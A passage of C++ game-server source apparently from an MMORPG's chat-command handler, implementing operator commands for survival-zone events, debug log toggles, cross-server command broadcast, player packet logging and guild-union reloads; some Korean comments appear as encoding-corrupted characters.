      pZone->getEventSurvivalZoneManager()->setRace(race);
      pZone->getEventSurvivalZoneManager()->startEvent();

      gcSystemMessage.setMessage("Open Race Survival Zone");
    } else if (pZone->isSurvivalZone() && pZone->getZoneID() == 8001 &&
               (race == 0 || race == 1 || race == 2)) {
      pZone->getEventSurvivalZoneManager()->setRaceSurvival(true);
      pZone->getEventSurvivalZoneManager()->setRace(race);
      pZone->getEventSurvivalZoneManager()->startEvent();

      gcSystemMessage.setMessage("Open Race Survival Zone");
    }

    else {
      gcSystemMessage.setMessage("Not in Survival Zone");
    }
  } else if (command == "startEdgearch") {
    Zone *pZone = pGamePlayer->getCreature()->getZone();
    Timeval currentTime;
    getCurrentTime(currentTime);
    Timeval tv;
    int addTime = (int)atoi(value1.c_str());

    if (pZone->isSurvivalZone() && pZone->getZoneID() == 8001 && addTime != 0 &&
        pZone->getEventSurvivalZoneManager()->getCurrentState() == 2) {
      tv.tv_sec = currentTime.tv_sec + addTime * 60;
      pZone->getEventSurvivalZoneManager()->setStandByEffectTime(tv);
      pZone->getEventSurvivalZoneManager()->initStandByEffectStep();
      pZone->getEventSurvivalZoneManager()->setEdgearchState(3);
      char msg[256];
      sprintf(msg, "Edge Arch will activate in %d minutes.", addTime);
      gcSystemMessage.setMessage(msg);
    } else if (pZone->isSurvivalZone() && pZone->getZoneID() == 8001 &&
               pZone->getEventSurvivalZoneManager()->getCurrentState() == 2) {
      pZone->getEventSurvivalZoneManager()->setEdgearchState(1);
      gcSystemMessage.setMessage("Activate Edge Arc");
    } else {
      gcSystemMessage.setMessage(
          "You are not in an event area, or combat has not yet begun.");
    }
  } else if (command == "eraseEdgearch") {
    Zone *pZone = pGamePlayer->getCreature()->getZone();

    if (pZone->isSurvivalZone() && pZone->getZoneID() == 8001) {
      pZone->getEventSurvivalZoneManager()->setEdgearchState(2);
      gcSystemMessage.setMessage("Deactivate Edge Arc");
    }
  } else if (command == "showTimeStampLog") {
    PlayerCreature *pPC =
        dynamic_cast<PlayerCreature *>(pGamePlayer->getCreature());

    if (pPC != NULL) {
      pPC->SetParameter<bool>("showTimeStampLog", true);

      gcSystemMessage.setMessage("show TimeStampLog");
    }
  } else if (command == "hideTimeStampLog") {
    PlayerCreature *pPC =
        dynamic_cast<PlayerCreature *>(pGamePlayer->getCreature());

    if (pPC != NULL) {
      pPC->SetParameter<bool>("showTimeStampLog", false);

      gcSystemMessage.setMessage("hide TimeStampLog");
    }
  } else if (command == "showSkillSpeedLog") {
    PlayerCreature *pPC =
        dynamic_cast<PlayerCreature *>(pGamePlayer->getCreature());

    if (pPC != NULL) {
      pPC->SetParameter<bool>("showSkillSpeedLog", true);

      gcSystemMessage.setMessage("show SkillSpeedLog");
    }
  } else if (command == "hideSkillSpeedLog") {
    PlayerCreature *pPC =
        dynamic_cast<PlayerCreature *>(pGamePlayer->getCreature());

    if (pPC != NULL) {
      pPC->SetParameter<bool>("showSkillSpeedLog", false);

      gcSystemMessage.setMessage("hide SkillSpeedLog");
    }

  } else {
    bSendPacket = false;
  }

  if (pGamePlayer != NULL && bSendPacket) {
    pGamePlayer->sendPacket(&gcSystemMessage);
    filelog("change.txt", "[%s] %s",
            pGamePlayer->getCreature()->getName().c_str(),
            gcSystemMessage.getMessage().c_str());
  }

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opworld(GamePlayer *pGamePlayer, string msg, int i,
                           bool bSameWorldOnly) throw(ProtocolException,
                                                      Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      size_t j = msg.find_first_of(' ', i + 1);
  string command = msg.substr(j + 1, msg.size() - j - 1).c_str();

  // packet
  GGCommand ggCommand;
  ggCommand.setCommand(command);

  // Send it to each server.
  HashMapGameServerInfo **pGameServerInfos =
      g_pGameServerInfoManager->getGameServerInfos();

  static int myWorldID = g_pConfig->getPropertyInt("WorldID");
  static int myServerID = g_pConfig->getPropertyInt("ServerID");

  int maxWorldID = g_pGameServerInfoManager->getMaxWorldID();
  int maxServerGroupID = g_pGameServerInfoManager->getMaxServerGroupID();

  for (int worldID = 1; worldID < maxWorldID; worldID++) {
    for (int groupID = 0; groupID < maxServerGroupID; groupID++) {
      HashMapGameServerInfo &gameServerInfo =
          pGameServerInfos[worldID][groupID];

      if (!gameServerInfo.empty()) {
        HashMapGameServerInfo::const_iterator itr = gameServerInfo.begin();
        for (; itr != gameServerInfo.end(); itr++) {
          GameServerInfo *pGameServerInfo = itr->second;

          if (pGameServerInfo->getWorldID() == myWorldID) {
            // Only if it's not the current server... (since it was handled above)
            if (pGameServerInfo->getGroupID() == myServerID) {
            } else {
              g_pLoginServerManager->sendPacket(pGameServerInfo->getIP(),
                                                pGameServerInfo->getUDPPort(),
                                                &ggCommand);
            }
          }
          // If it's a different world. Unless you're only rendering in the same world...
          else if (!bSameWorldOnly) {
            g_pLoginServerManager->sendPacket(pGameServerInfo->getIP(),
                                              pGameServerInfo->getUDPPort(),
                                              &ggCommand);
          }
        }
      }
    }
  }

  __END_DEBUG_EX __END_CATCH
}

void CGSayHandler::opsoulchain(GamePlayer *pPlayer, string msg,
                               int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      size_t j = msg.find_first_of(' ', i + 1);

  string Name = msg.substr(j + 1, msg.size() - j - 1).c_str();

  CGSkillToNamed packet;
  packet.setSkillType(SKILL_SOUL_CHAIN);
  packet.setTargetName(Name);

  packet.execute(pPlayer);

  __END_DEBUG_EX __END_CATCH
}

void CGSayHandler::oplog(GamePlayer *pPlayer, string msg,
                         int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      size_t j = msg.find_first_of(' ', i + 1);
  size_t k = msg.find_first_of(' ', j + 1);
  uint sec = 0;
  string name;

  if (k == string::npos) {
    name = msg.substr(j + 1, msg.size() - j - 1).c_str();
  } else {
    name = trim(msg.substr(j + 1, k - j - 1));
    sec = (uint)atoi(msg.substr(k + 1, msg.size() - k - 1).c_str());
  }

  Creature *pTargetCreature = NULL;

  __ENTER_CRITICAL_SECTION((*g_pPCFinder))

  pTargetCreature = g_pPCFinder->getCreature_LOCKED(name);
  if (pTargetCreature == NULL) {
    g_pPCFinder->unlock();
    return;
  }

  GamePlayer *pTargetGamePlayer =
      dynamic_cast<GamePlayer *>(pTargetCreature->getPlayer());

  if (pTargetGamePlayer == NULL) {
    g_pPCFinder->unlock();
    return;
  }

  if (sec == 0)
    sec = 600;

  if (pTargetGamePlayer->startPacketLog(sec)) {
    char msg[100];
    sprintf(msg, "%s PacketLog� ��(%u�)", name.c_str(), sec);

    GCSystemMessage gcMsg;
    gcMsg.setMessage(msg);
    pPlayer->sendPacket(&gcMsg);
  }

  __LEAVE_CRITICAL_SECTION((*g_pPCFinder))

  __END_DEBUG_EX __END_CATCH
}

void CGSayHandler::opmodifyunioninfo(
    GamePlayer *pGamePlayer, string msg, int i,
    bool bSameWorldOnly) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      size_t j = msg.find_first_of(' ', i + 1);
  uint gID = (uint)atoi(msg.substr(j + 1, msg.size() - j - 1).c_str());

  cout << "ModifyunionInfo->sharedserver() : " << (int)gID << endl;

  sendGCOtherModifyInfoGuildUnionByGuildID(gID);

  __END_DEBUG_EX __END_CATCH
}

void CGSayHandler::oprefreshguildunion(
    GamePlayer *pGamePlayer, string msg, int i,
    bool bSameWorldOnly) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      size_t j = msg.find_first_of(' ', i + 1);
  string command = msg.substr(j + 1, msg.size() - j - 1).c_str();

  cout << "GuildUnionManager->reload()" << endl;

  GuildUnionManager::Instance().reload();

  /*
          // packet
          GGCommand ggCommand;
          ggCommand.setCommand( command );


          // � server� 보��.
          HashMapGameServerInfo** pGameServerInfos =
     g_pGameServerInfoManager->getGameServerInfos();


          static int myWorldID = g_pConfig->getPropertyInt("WorldID");
          static int myServerID = g_pConfig->getPropertyInt("ServerID");

          int maxWorldID = g_pGameServerInfoManager->getMaxWorldID();
          int maxServerGroupID =
     g_pGameServerInfoManager->getMaxServerGroupID();


          for (int worldID=1; worldID<maxWorldID; worldID++)
          {
                  for (int groupID=0; groupID<maxServerGroupID; groupID++)
                  {
                          HashMapGameServerInfo& gameServerInfo =
     pGameServerInfos[worldID][groupID];

                          if (!gameServerInfo.empty())
                          {
                                  HashMapGameServerInfo::const_iterator itr =
     gameServerInfo.begin(); for (; itr != gameServerInfo.end(); itr++)
                                  {
                                          GameServerInfo* pGameServerInfo =
     itr->second;

                                          if
     (pGameServerInfo->getWorldID()==myWorldID)
                                          {
                                                  //  �� 
     경���..( �리����) if
     (pGameServerInfo->getGroupID()==myServerID)
                                                  {
                                                  }
                                                  else
                                                  {
                                                          g_pLoginServerManager->sendPacket(
     pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );
                                                  }
                                          }
                                          // �른 World 경�. � world�
     �리�� �면.. else if (!bSameWorldOnly)
                                          {
                                                  g_pLoginServerManager->sendPacket(
     pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );

                                          }
                                  }
                          }
                  }
          }
  */
  __END_DEBUG_EX __END_CATCH
}

#endif
